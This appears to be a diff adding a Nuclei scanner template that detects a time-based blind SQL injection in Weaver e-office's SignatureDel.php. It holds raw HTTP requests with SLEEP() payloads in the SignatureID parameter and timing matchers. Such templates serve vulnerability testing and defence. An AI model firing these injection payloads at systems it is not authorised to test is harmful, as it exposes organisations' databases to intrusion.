@@ -1,0 +1,23 @@
+id: Weaver-e-office-SignatureDel_php-sql-time
+info:
+  name: 泛微e-office SignatureDel.php sql注入漏洞
+  author: xxx
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(4)))x) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+      - |
+        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(8)))x) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
